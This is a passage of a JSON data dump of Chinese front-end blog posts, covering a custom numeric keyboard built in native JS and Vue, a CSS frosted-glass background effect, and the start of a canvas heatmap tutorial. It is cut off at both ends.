”，可以每添加一个数字或者小数点就先加一个带点击事件的空元素space，再添加要输入的字符。space是为了绑定一个点击事件，告诉光标要移动到的位置。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//字符插入，在光标前插入字符\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e insert(value) {\n\u0009var span = document.createElement(\u003cspan class=\"hljs-string\"\u003e\"span\"\u003c/span\u003e); //创建包含值的元素\n\u0009span.className = \u003cspan class=\"hljs-string\"\u003e'val'\u003c/span\u003e;\n\u0009span.innerText = value;\n\n\u0009var space = document.createElement(\u003cspan class=\"hljs-string\"\u003e\"span\"\u003c/span\u003e);\n\u0009space.className = \u003cspan class=\"hljs-string\"\u003e'space'\u003c/span\u003e;\n\u0009space.addEventListener(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e, moveCursor);\n\n\u0009var cursor = document.getElementsByClassName(\u003cspan class=\"hljs-string\"\u003e'cursor'\u003c/span\u003e)[0];\n\n\u0009inputArea.insertBefore(space, cursor);//插入空列\n\u0009inputArea.insertBefore(span, cursor);//插入值\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e删除时也是先删除光标之前的数字字符，再删除space元素。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//删除元素\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003edeleteElement\u003c/span\u003e\u003c/span\u003e() {\n\u0009\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eCursorFlash();\n\u0009var cursor = document.getElementsByClassName(\u003cspan class=\"hljs-string\"\u003e'cursor'\u003c/span\u003e)[0];\n\u0009var n = 2; //两个删除动作\n \u0009\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e(cursor.previousSibling \u0026amp;\u0026amp; n \u0026gt; 0) {\n    inputArea.removeChild(cursor.previousSibling );\n    n--;\n \u0009}\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(getInputStr().search(/^\\.\\d*/) \u0026gt; -1) {\n\u0009\u0009insert(0);\n\u0009}\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(getInputStr() === \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e){ //元素为空placeholder显示\n\u0009\u0009var placeHolder = document.getElementsByClassName(\u003cspan class=\"hljs-string\"\u003e'holder'\u003c/span\u003e)[0];\n\u0009\u0009placeHolder.className = \u003cspan class=\"hljs-string\"\u003e'holder'\u003c/span\u003e;\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e通过chrome里面元素审查可以看到添加删除的过程。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb490ca50f8d?w=511\u0026amp;h=389\u0026amp;f=gif\u0026amp;s=502766\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e图4 添加、删除、光标移动元素变化图\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e每一个space元素都绑定一个click事件，用来移动光标，最右边有个right-space可以用来放placeholder,也可以添加click事件，点击时光标总是移到最后一位。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//移动光标位置\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e moveCursor(event) {\n\u0009var cursor = document.getElementsByClassName(\u003cspan class=\"hljs-string\"\u003e'cursor'\u003c/span\u003e)[0];//获取光标\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(event.currentTarget.className == \u003cspan class=\"hljs-string\"\u003e'right-space'\u003c/span\u003e){\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!cursor.nextSibling || cursor.nextSibling.nodeName == \u003cspan class=\"hljs-string\"\u003e'#text'\u003c/span\u003e){\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n\u0009\u0009} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n\u0009\u0009\u0009var ele = cursor.nextSibling;\n\u0009\u0009\u0009inputArea.insertBefore(inputArea.lastElementChild, ele);\n\u0009\u0009\u0009inputArea.appendChild(cursor);\n\u0009\u0009}\n\u0009}\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n\u0009\u0009var tempEle = event.currentTarget.nextSibling;\n\u0009\u0009// var nodeName = event.currentTarget.nextSibling.nodeName;\n\u0009\u0009// var cursor = document.getElementsByClassName(\u003cspan class=\"hljs-string\"\u003e'cursor'\u003c/span\u003e)[0];\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!tempEle || tempEle.nodeName == \u003cspan class=\"hljs-string\"\u003e'#text'\u003c/span\u003e) {\n\u0009\u0009\u0009var temp = event.currentTarget.previousSibling;\n\u0009\u0009\u0009var ele = inputArea.replaceChild( event.currentTarget, cursor);//把光标替换成当前元素\n\u0009\u0009\u0009inputArea.appendChild(ele);\n\u0009\u0009} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n\u0009\u0009\u0009var temp = event.currentTarget.nextSibling;\n\u0009\u0009\u0009var ele = inputArea.replaceChild( event.currentTarget, cursor);//把光标替换成当前元素\n\u0009\u0009\u0009inputArea.insertBefore(ele, temp);\n\u0009\u0009}\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e从上面的GIF图可以看出，光标始终只有一个而且有个定时任务。光标的闪动设置如下，使用原生的setInterval实现。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//设置光标定时任务\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003esetCursorFlash\u003c/span\u003e\u003c/span\u003e() {\n\u0009//placeholder 隐藏\n\u0009var placeHolder = document.getElementsByClassName(\u003cspan class=\"hljs-string\"\u003e'holder'\u003c/span\u003e)[0];\n\u0009placeHolder.className = \u003cspan class=\"hljs-string\"\u003e'holder hidden'\u003c/span\u003e;\n\n\u0009var cursor = document.getElementsByClassName(\u003cspan class=\"hljs-string\"\u003e'cursor'\u003c/span\u003e)[0];\n\u0009var inputContainer = document.getElementsByClassName(\u003cspan class=\"hljs-string\"\u003e'input-container'\u003c/span\u003e)[0];\n\u0009cursor.className = \u003cspan class=\"hljs-string\"\u003e\"cursor\"\u003c/span\u003e;\n\u0009var isShowCursor = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n\u0009inputContainer.focus();\n\u0009showKeyBoard();\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (intervalId) {\n\u0009\u0009clearInterval(intervalId);\n\u0009}\n\u0009intervalId = \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eInterval(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n\u0009\u0009isShowCursor = !isShowCursor;\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (isShowCursor) {\n\u0009\u0009\u0009cursor.className = \u003cspan class=\"hljs-string\"\u003e'cursor'\u003c/span\u003e;\n\u0009\u0009} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n\u0009\u0009\u0009cursor.className = \u003cspan class=\"hljs-string\"\u003e'cursor hidden'\u003c/span\u003e;\n\u0009\u0009}\n\u0009}, 1000);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最终使用原生js实现的带输入框、光标，keyboard的假数字键盘。\u003c/p\u003e\n\u003cp\u003e除了完成以上功能，还实现了输入前验证功能，为了跟接近真实输入框表现，同时实现了点击\u003c/p\u003e\n\u003cp\u003e输入框获取焦点、光标闪动、弹出键盘；失去焦点光标消失。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e为什么不使用jQuery？\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e一是因为，当前的H5项目没有使用jQuery。\u003c/p\u003e\n\u003cp\u003e二是因为使用VUE之后很少需要直接操作DOM，少数方法自己实现更轻量，若是只为了使用\u003c/p\u003e\n\u003cp\u003e其一两个方法而引入jQuery，会使得项目更重。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e原生js实现效果\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e图5 原生js实现输入框、光标、键盘全假套件效果图\n源码\u003ca target=\"_blank\"\u003ehttps://github.com/DaisyWang88/js-keyboard\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e手机扫码验证：\n\u003ca target=\"_blank\" href=\"http://sandbox.runjs.cn/show/mvjrcagy\"\u003ehttp://sandbox.runjs.cn/show/mvjrcagy\u003c/a\u003e(chrome插件url二维码生成器GetCrx.cn)\u003c/p\u003e\n\u003cp\u003e由于移动端click事件有300毫秒延时，因此原生js实现的效果，有点不是很流畅。若使用原生JS实现版的需要使fastclick或zepto的tap事件解决延时问题。\u003c/p\u003e\n\u003cp\u003ePS：之前说‘VUE本身解决300毫秒延时问题’，考证之后发现不对，给大家带来困扰实在抱歉。\u003c/p\u003e\n\u003cp\u003e考证之后发现VUE的click事件都是原生的click并没有处理这个延时。为了不让大家困扰，github上的demo已经使用fastClick解决了延时问题，（之前太懒了\u0026gt;.\u0026lt;）。现在原生的js实现效果也很顺畅了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eVUE组件化\u003c/h2\u003e\n\u003cp\u003e考虑到项目里有的应用场景有多个输入框，当然输入的时候只需要一个键盘，因此组件化的时候将输入框作为一个组件v-input，键盘作为一个组件v-keyboard。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e输入框和键盘的交互\u003c/h3\u003e\n\u003cp\u003e交互图如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cbd97c7d670f?w=597\u0026amp;h=425\u0026amp;f=jpeg\u0026amp;s=19264\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e 图6 VUE组件交互图\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e考虑到本项目里面存在一个页面多个输入框的场景，因此需要控制键盘与哪个输入框配合使用。\u003c/p\u003e\n\u003cp\u003e为了达到这样的目的，采用“当点击输入框获取焦点的时候，将当前v-input输入框组件的实例传给v-keyboard键盘组件”的方式。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ethis.$refs.virtualKeyBoard.$emit('getInputVm', this.$refs.virtualInput);\u003c/code\u003e\n如图6 ，v-keyboard组件会监听'getInputVm'事件，获取v-input的实例。\u003c/p\u003e\n\u003cp\u003e键盘组件v-keyboard获取到输入框组件v-input的实例之后就可以根据键盘的点击事件——添加或删除，操作输入框组件v-input来放入或者删除字符了。\u003c/p\u003e\n\u003cp\u003e这样即使有多个输入框，也方便控制键盘和输入框之间的操作。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e输入框自动获取焦点，键盘自动弹出\u003c/h3\u003e\n\u003cp\u003e需求里要求进入某个页面输入框自动获取焦点，键盘自动弹出。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e输入框自动获取焦点可以通过设置is-auto-focus来控制是否自动获取焦点。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;v-input\n    ref=\u003cspan class=\"hljs-string\"\u003e\"virtualInput\"\u003c/span\u003e\n    v-model=\u003cspan class=\"hljs-string\"\u003e\"amount\"\u003c/span\u003e\n    :placeholder=\u003cspan class=\"hljs-string\"\u003e\"placeText\"\u003c/span\u003e\n    :is-auto-focus=\u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e\n    @show-key-board=\u003cspan class=\"hljs-string\"\u003e\"showKeyBoard\"\u003c/span\u003e\u0026gt;\n\u0026lt;/v-input\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e要自动弹出键盘如图6，需要在页面实例化完成之后将相应的输入框组件v-input的实例传给键盘组件v-keyboard。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.\u003cspan class=\"hljs-variable\"\u003e$refs\u003c/span\u003e.virtualKeyBoard.\u003cspan class=\"hljs-variable\"\u003e$emit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'getInputVm'\u003c/span\u003e, this.\u003cspan class=\"hljs-variable\"\u003e$refs\u003c/span\u003e.virtualInput);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e键盘组间捕获'getInputVm'事件之后获取了相应输入框的实例，同时自动弹出。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.\u003cspan class=\"hljs-variable\"\u003e$on\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'getInputVm'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(obj) {\n     this.refObject = obj;\n     this.isShow = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003ev-model支持\u003c/h3\u003e\n\u003cp\u003evue支持自定义v-model，子组件设置一个value 的 props。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eprops: {\n    value: {\n      \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: String,\n      default: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n    },\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在value改变的时候$emit一个'input'事件并把相应的值传出去就可以实现v-model的双向绑定了。this.getInputStr()是用来获取输入框中字符串的函数。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.\u003cspan class=\"hljs-variable\"\u003e$emit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'input'\u003c/span\u003e, this.getInputStr());\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果如下：\u003c/p\u003e\n\u003cp\u003e源码参见\u003ca target=\"_blank\" href=\"https://github.com/DaisyWang88/VUE-keyboard\"\u003ehttps://github.com/DaisyWang88/VUE-keyboard\u003c/a\u003e。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e总结\u003c/h2\u003e\n\u003cp\u003e原生的input 设置type =number，想要做输入前验证控制小数点个数和小数位数等功能基本很难实现，要在输入前取到值也是存在各种兼容性问题，目前只有ontextInput在移动端能在输入前准确取到值，还有个关键的问题type =number的时候取到的value不包含小数点，导致输入前使用正则验证几乎无法实现；若是设置type= text 虽然能取到输入框中所有字符，但是就无法弹出数字键盘。要想使用原生input输入小数，就必须有所取舍。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e要么不做输入前验证，使用type = number ，可以输入多个小数点，只在数值数值不合法的时候提示输入不合法，但是只有android可以弹出数字键盘，IOS仍然弹出全键盘。用户体验可能差些。\u003c/li\u003e\n\u003cli\u003e要么使用type = text，虽然可以做到输入前验证（因为可以取到全部字符），但是所有机型都只会弹全键盘了，用户体验也一般。\u003c/li\u003e\n\u003cli\u003e以上两种都无法实现进入页面键盘自动弹出，只能借助NA提供的方法实现。\u003c/li\u003e\n\u003cli\u003e如果你是强迫症癌晚期患者，用户体验之上者，那么你就可以跟我一样做个假键盘，这样以上问题都不是问题。还可以添加附加功能，比如输入的时候若在第一位输入小数点的时候，前面自动补'0'；删除的时候，若小数点在第一位前面自动补'0'；还可以定制光标颜色、键盘样式等等。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e很不幸，我就是一个强迫症癌晚期患者，目前实现的键盘套件改造成VUE组件已经成功在项目中使用，有单输入框的页面，也有多输入框的页面，支持placeholder 和v-model。\u003c/p\u003e\n","buildTime":"1514893872.7445","__v":0}
{"_id":{"$oid":"5a4b76d92239bd131cd79f3b"},"id":"5a45a89051882574d23ca7d6","author":{"$oid":"5a4b76d92239bd131cd79f2a"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"实现div毛玻璃背景","meta":{"likeCount":0},"tag":["CSS","前端"],"comment":[],"shortContent":"这里仅仅用到了其中的blur，帮助实现高斯模糊的效果。 参数默认是0，单位px，不接受%，参数值的大小表示屏幕上以多少像素融在一起， 所以值越大越模糊。 :before是css中的一种伪元素，可用于在某个元素之前插入某些内容。 毛玻璃背景上文字内容显示效果并不理想，无论字体颜色…","content":"\u003cp\u003e原文在我的博客 ☞ \u003ca target=\"_blank\" href=\"http://hellopan.top/2017/10/31/%E5%AE%9E%E7%8E%B0div%E6%AF%9B%E7%8E%BB%E7%92%83%E8%83%8C%E6%99%AF/\"\u003e实现div毛玻璃背景\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e毛玻璃效果\u003c/h2\u003e\n\u003cp\u003e本文介绍一个实现div毛玻璃背景的方法\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eCSS3 Filter\u003c/h2\u003e\n\u003cp\u003eCSS3的Filter主要用在图像的特效处理上，默认值为\u003ccode\u003enone\u003c/code\u003e，还有以下备选项：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003egrayscale灰度\u003c/li\u003e\n\u003cli\u003esepia褐色\u003c/li\u003e\n\u003cli\u003esaturate饱和度\u003c/li\u003e\n\u003cli\u003ehue-rotate色相旋转\u003c/li\u003e\n\u003cli\u003einvert反色\u003c/li\u003e\n\u003cli\u003eopacity透明度\u003c/li\u003e\n\u003cli\u003ebrightness亮度\u003c/li\u003e\n\u003cli\u003econtrast对比度\u003c/li\u003e\n\u003cli\u003eblur模糊\u003c/li\u003e\n\u003cli\u003edrop-shadow阴影\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e每一种效果大家可以自己试试，考虑一下可以用在哪些方面，\n这里仅仅用到了其中的\u003ccode\u003eblur\u003c/code\u003e，帮助实现高斯模糊的效果。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e兼容性  ☞   \u003ca target=\"_blank\" href=\"https://caniuse.com/#feat=css-filter-function\"\u003ecaniuse\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003efilter:blur()\u003c/h2\u003e\n\u003cp\u003e参数默认是0，单位\u003ccode\u003epx\u003c/code\u003e，不接受\u003ccode\u003e%\u003c/code\u003e，参数值的大小表示屏幕上以多少像素融在一起， 所以值越大越模糊。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e:before()\u003c/h2\u003e\n\u003cp\u003e:before是css中的一种伪元素，可用于在某个元素之前插入某些内容。\n用它来添加模糊 ☞ \u003ca target=\"_blank\" href=\"http://hellopan.top/2017/10/15/CSS%e7%9f%a5%e8%af%86%e7%82%b9/#before%E5%92%8C-after\"\u003e:before和:after\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003ergba()\u003c/h2\u003e\n\u003cp\u003e毛玻璃背景上文字内容显示效果并不理想，无论字体颜色深或浅，看着总是怪怪的...因此还需要加上一层带色的半透明背景，一般是黑色，或白色。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e示例：\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"毛玻璃效果.png\" src=\"https://user-gold-cdn.xitu.io/2017/12/29/160a01a6ea2e4a4f?w=1240\u0026amp;h=689\u0026amp;f=png\u0026amp;s=984111\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e整体通过三层重叠实现，\n最下面是模糊层\u003ccode\u003e.blur_box:before\u003c/code\u003e，设置\u003ccode\u003ez-index: -2\u003c/code\u003e。\n中间是rgba层\u003ccode\u003e.rgba\u003c/code\u003e，设置\u003ccode\u003ez-index: -1\u003c/code\u003e。\n最上面是内容层\u003ccode\u003e.blur_box\u003c/code\u003e，设置\u003ccode\u003ez-index: 0\u003c/code\u003e。\n代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html lang=\"en\"\u0026gt;\n\u0026lt;head\u0026gt;\n  \u0026lt;meta charset=\"UTF-8\"\u0026gt;\n  \u0026lt;title\u0026gt;毛玻璃效果\u0026lt;/title\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;style\u0026gt;\n*{\n  margin: 0;\n  padding: 0;\n}\n.bg{\n  background:url(1.jpg) no-repeat center center fixed;/* 与下面的blur_box:before中的background设置一样 */\n  width:100%;\n  height:100%;\n}\n\n\n.blur_box{\n  z-index: 0;/* 为不影响内容显示必须为最高层 */\n  position: relative;\n  overflow: hidden;\n}\n.blur_box:before{\n  content: \"\";/* 必须包括 */\n  position: absolute;/* 固定模糊层位置 */\n  width:300%;\n  height:300%;\n\n  left: -100%;/* 回调模糊层位置 */\n  top: -100%;/* 回调模糊层位置 */\n\n  background:url(1.jpg) no-repeat center center fixed;/* 与上面的bg中的background设置一样 */\n  filter: blur(20px);/* 值越大越模糊 */\n\n  z-index: -2;/* 模糊层在最下面 */\n}\n.rgba{\n  background-color: rgba(0, 0, 0, 0.2);/* 为文字更好显示，将背景颜色加深 */\n  position: absolute;/* 固定半透明色层位置 */\n  width:100%;\n  height:100%;\n  z-index: -1;/* 中间是rgba半透明色层 */\n}\n\n.content_text{\n  text-align: center;\n  color: rgba(255, 255, 255, 0.8);\n  padding: 50px 30px;\n  line-height: 28px;\n}\narticle{\n  width:40%;\n  height:300px;\n  margin:120px auto;\n}\n\n\u0026lt;/style\u0026gt;\n\u0026lt;body\n  \u0026lt;div class=\"bg\"\u0026gt;\n    \u0026lt;article class=\"blur_box\"\u0026gt;\n      \u0026lt;div class=\"rgba\"\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;!-- 写在这其实和blur_box:before效果相同，但已经设置过blur_box:before了 --\u0026gt;\n      \u0026lt;div class=\"content_text\"\u0026gt;\n        \u0026lt;h1\u0026gt;haha\u0026lt;/h1\u0026gt;\n        \u0026lt;p\u0026gt;texttexttexttexttexttexttexttexttext\u0026lt;/p\u0026gt;\n        \u0026lt;p\u0026gt;texttexttexttexttexttexttexttexttext\u0026lt;/p\u0026gt;\n        \u0026lt;p\u0026gt;texttexttexttexttexttexttexttexttext\u0026lt;/p\u0026gt;\n        \u0026lt;p\u0026gt;texttexttexttexttexttexttexttexttext\u0026lt;/p\u0026gt;\n        \u0026lt;p\u0026gt;texttexttexttexttexttexttexttexttext\u0026lt;/p\u0026gt;\n        \u0026lt;p\u0026gt;texttexttexttexttexttexttexttexttext\u0026lt;/p\u0026gt;\n      \u0026lt;/div\u0026gt;\n    \u0026lt;/article\u0026gt;\n  \u0026lt;/div\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e注释已经写的很详细了，但有一点还是得单独说一下。因为blur()产生的模糊效果当值越大时，就会有越宽的边缘渐变过渡，为了消除(实际上只是让它看不见)，我将模糊层的宽度和高度都变大，再通过\u003ccode\u003etop\u003c/code\u003e和\u003ccode\u003eleft\u003c/code\u003e负值调整位置。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\" lang=\"css\"\u003e\u003cspan class=\"hljs-selector-class\"\u003e.blur_box\u003c/span\u003e\u003cspan class=\"hljs-selector-pseudo\"\u003e:before\u003c/span\u003e{\n  \u003cspan class=\"hljs-attribute\"\u003econtent\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e;\n  \u003cspan class=\"hljs-attribute\"\u003eposition\u003c/span\u003e: absolute;\n  \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e300%\u003c/span\u003e;\u003cspan class=\"hljs-comment\"\u003e/* 模糊层的宽度和高度都变大 */\u003c/span\u003e\n  \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e300%\u003c/span\u003e;\n  \u003cspan class=\"hljs-attribute\"\u003eleft\u003c/span\u003e: -\u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\u003cspan class=\"hljs-comment\"\u003e/* 回调模糊层位置 */\u003c/span\u003e\n  \u003cspan class=\"hljs-attribute\"\u003etop\u003c/span\u003e: -\u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n  \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e:\u003cspan class=\"hljs-built_in\"\u003eurl\u003c/span\u003e(1.jpg) no-repeat center center fixed; \n  \u003cspan class=\"hljs-attribute\"\u003efilter\u003c/span\u003e: \u003cspan class=\"hljs-built_in\"\u003eblur\u003c/span\u003e(20px);\n  \u003cspan class=\"hljs-attribute\"\u003ez-index\u003c/span\u003e: -\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中\u003ccode\u003e.rgba\u003c/code\u003e也可改为白色半透明\u003ccode\u003ebackground-color: rgba(255,255,255,0.2);\u003c/code\u003e，完全取决于自己，然后相应改变内容的字色。\u003ccode\u003eblur()\u003c/code\u003e的参数也可以根据自己爱好试着改变出想要的效果。\u003c/p\u003e\n","buildTime":"1514893376.5316","__v":0}
{"_id":{"$oid":"5a4b76d92239bd131cd79f3c"},"id":"5a41f3a451882560b76c6d05","author":{"$oid":"5a4b76d92239bd131cd79f27"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"你不知道的前端算法之热力图的实现","meta":{"likeCount":0},"tag":["JavaScript","前端框架","前端","Canvas","算法"],"comment":[],"shortContent":"inMap 是一款基于 canvas 的大数据可视化库，专注于大数据方向点线面的可视化效果展示。目前支持散点、围栏、热力、网格、聚合等方式；致力于让大数据可视化变得简单易用。 热力图这个名字听起来很高大上，其实等同于我们常说的密度图。 如图表示，红色区域表示分析要素的密度大，而…","content":"\u003cblockquote\u003e\n\u003cp\u003e本文作者：TalkingData 可视化工程师李凤禄\u003c/p\u003e\n\u003cp\u003e编辑：Aresn\u003c/p\u003e\n\u003cp\u003e欢迎加入 QQ 群参与技术讨论：618308202\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003einMap 是一款基于 canvas 的大数据可视化库，专注于大数据方向点线面的可视化效果展示。目前支持散点、围栏、热力、网格、聚合等方式；致力于让大数据可视化变得简单易用。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eGitHub 地址：\u003ca target=\"_blank\" href=\"https://github.com/TalkingData/inmap\"\u003ehttps://github.com/TalkingData/inmap\u003c/a\u003e (点个 Star 支持下作者吧！)\u003c/h3\u003e\n\u003cp\u003e热力图这个名字听起来很高大上，其实等同于我们常说的密度图。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/26/160909bd5c440464?w=706\u0026amp;h=494\u0026amp;f=gif\u0026amp;s=2346381\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e如图表示，红色区域表示分析要素的密度大，而蓝色区域表示分析要素的密度小。只要点密集，就会形成聚类区域。\n看到这么炫的效果，是不是自己也很想实现一把？接下来手把手实现一个热力（带你装逼带你飞、 哈哈），郑重声明：下面代码片段均来自 \u003ca target=\"_blank\" href=\"https://github.com/TalkingData/inmap\"\u003einMap\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e准备数据\u003c/h3\u003e\n\u003cp\u003einMap 接收的是经纬度数据，需要把它映射到 canvas 的像素坐标，这就用到了墨卡托转换，墨卡托算法很复杂，以后我们会有单独的一篇文章来讲讲他的原理。经过转换，你得到的数据应该是这样的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e[\n  {\n    \u003cspan class=\"hljs-string\"\u003e\"lng\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"116.395645\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"lat\"\u003c/span\u003e: 39.929986,\n    \u003cspan class=\"hljs-string\"\u003e\"count\"\u003c/span\u003e: 6,\n    \u003cspan class=\"hljs-string\"\u003e\"pixel\"\u003c/span\u003e: { //像素坐标\n      \u003cspan class=\"hljs-string\"\u003e\"x\"\u003c/span\u003e: 689,\n      \u003cspan class=\"hljs-string\"\u003e\"y\"\u003c/span\u003e: 294\n    }\n  },\n  {\n    \u003cspan class=\"hljs-string\"\u003e\"lng\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"121.487899\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"lat\"\u003c/span\u003e: 31.249162,\n    \u003cspan class=\"hljs-string\"\u003e\"count\"\u003c/span\u003e: 10,\n    \u003cspan 